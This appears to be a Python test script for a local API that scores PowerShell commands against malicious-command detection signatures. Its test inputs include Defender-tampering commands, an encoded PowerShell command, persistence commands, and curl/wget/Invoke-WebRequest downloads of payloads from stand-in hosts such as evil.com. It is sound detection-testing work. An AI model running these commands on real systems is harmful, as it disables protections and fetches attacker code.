#!/usr/bin/env python3
"""
Teste da rota /analyze-pcre2 com signatures do banco Supabase
"""

import requests
import json

# URL da API
API_URL = "http://localhost:8000/analyze-pcre2"

# Comandos de teste
test_commands = [
    "Get-Process",  # Comando seguro
    "Invoke-Expression 'Get-Process'",  # Deve detectar Invoke-Expression se estiver no banco
    "iex 'Get-Process'",  # Deve detectar alias iex se estiver no banco
    "Set-MpPreference -DisableRealtimeMonitoring $true",  # Deve detectar tampering MS Defender se estiver no banco
    "Register-ScheduledTask -TaskName 'Test' -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date))",  # Deve detectar Scheduled Task se estiver no banco
    "New-Service -Name 'TestService' -BinaryPathName 'C:\\test.exe'",  # Deve detectar Service Creation se estiver no banco
    "powershell -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA=",  # Base64 longo se estiver no banco
    "New-Object System.Net.WebClient",  # Deve detectar Web Client traces
    "Invoke-RestMethod -Uri 'http://test.com/script.ps1'",  # Deve detectar Web Client traces
    "curl -o C:\\temp\\malware.ps1 http://evil.com/payload.ps1"  # Deve detectar Web Client traces
]

def test_analysis():
    print("🧪 Testando rota /analyze-pcre2 com signatures do banco Supabase\n")
    
    for i, command in enumerate(test_commands, 1):
        print(f"📝 Teste {i}: {command}")
        
        try:
            response = requests.post(API_URL, json={"command": command})
            
            if response.status_code == 200:
                result = response.json()
                analysis = result["analysis"]
                
                print(f"✅ Status: {analysis['severity'].upper()}")
                print(f"🔢 Score: {analysis['risk_score']}/10")
                print(f"⚠️  Malicioso: {'Sim' if analysis['is_malicious'] else 'Não'}")
                print(f"🎯 Signatures detectadas: {analysis['detected_count']}/{analysis['total_signatures_checked']}")
                
                # Informações sobre cache
                if 'cache_info' in analysis:
                    cache_info = analysis['cache_info']
                    print(f"💾 Cache: {'Ativo' if cache_info['cached'] else 'Inativo'}")
                    if cache_info['cached']:
                        print(f"⏰ Idade do cache: {cache_info['cache_age_minutes']} minutos")
                
                if analysis['signatures_detected']:
                    print("🔍 Detalhes das signatures:")
                    for sig in analysis['signatures_detected']:
                        print(f"   • {sig['name']} (Score: {sig['score']})")
                        print(f"     Pattern: {sig['pattern']}")
                        print(f"     Matched: {sig['matched_text']}")
                        print(f"     Severity: {sig['severity']}")
                        print(f"     Táticas: {', '.join(sig['tactics'])}")
                        print(f"     Técnicas: {', '.join(sig['techniques'])}")
                        if sig.get('reference'):
                            print(f"     Referências: {', '.join(sig['reference'])}")
                        print()
                else:
                    print("✅ Nenhuma signature detectada")
                
            else:
                print(f"❌ Erro: {response.status_code}")
                print(f"Resposta: {response.text}")
                
        except Exception as e:
            print(f"❌ Exceção: {e}")
        
        print("-" * 80)
        print()

def test_database_connection():
    """Testa se a conexão com o banco está funcionando"""
    print("🔌 Testando conexão com banco de dados...")
    
    try:
        response = requests.post(API_URL, json={"command": "test"})
        
        if response.status_code == 200:
            result = response.json()
            analysis = result["analysis"]
            print(f"✅ Conexão OK - {analysis['total_signatures_checked']} signatures carregadas do banco")
            return True
        elif response.status_code == 500:
            print("❌ Erro no banco - verifique as variáveis de ambiente")
            return False
        else:
            print(f"⚠️ Status inesperado: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"❌ Erro de conexão: {e}")
        return False

def test_webclient_specific():
    """Teste específico para WebClient signature"""
    print("🌐 Teste específico para WebClient signature...")
    
    webclient_commands = [
        "New-Object System.Net.WebClient",
        "Invoke-RestMethod -Uri 'http://test.com/script.ps1'",
        "Invoke-WebRequest -Uri 'https://evil.com/malware.ps1'",
        "curl -o C:\\temp\\malware.ps1 http://attacker.com/payload.ps1",
        "wget http://malware.com/script.ps1 -OutFile C:\\temp\\malware.ps1"
    ]
    
    for command in webclient_commands:
        print(f"\n🔍 Testando: {command}")
        try:
            response = requests.post(API_URL, json={"command": command})
            
            if response.status_code == 200:
                result = response.json()
                analysis = result["analysis"]
                
                if analysis['signatures_detected']:
                    for sig in analysis['signatures_detected']:
                        if 'Web Client' in sig['name']:
                            print(f"✅ WebClient signature detectada!")
                            print(f"   Pattern: {sig['pattern']}")
                            print(f"   Matched: {sig['matched_text']}")
                            print(f"   Score: {sig['score']}")
                        else:
                            print(f"⚠️ Outra signature detectada: {sig['name']}")
                else:
                    print("❌ Nenhuma signature detectada")
                    
            else:
                print(f"❌ Erro: {response.status_code}")
                
        except Exception as e:
            print(f"❌ Exceção: {e}")

if __name__ == "__main__":
    # Primeiro testar conexão com banco
    if test_database_connection():
        print("\n" + "="*80)
        print("🚀 Iniciando testes de análise...")
        print("="*80 + "\n")
        test_analysis()
        
        print("\n" + "="*80)
        print("🌐 Teste específico para WebClient...")
        print("="*80 + "\n")
        test_webclient_specific()
    else:
        print("\n❌ Não foi possível conectar ao banco. Verifique:")
        print("   1. Arquivo .env configurado com SUPABASE_URL e SUPABASE_SERVICE_ROLE_KEY")
        print("   2. Banco Supabase rodando e acessível")
        print("   3. Tabela powershell_signatures existe e tem dados")
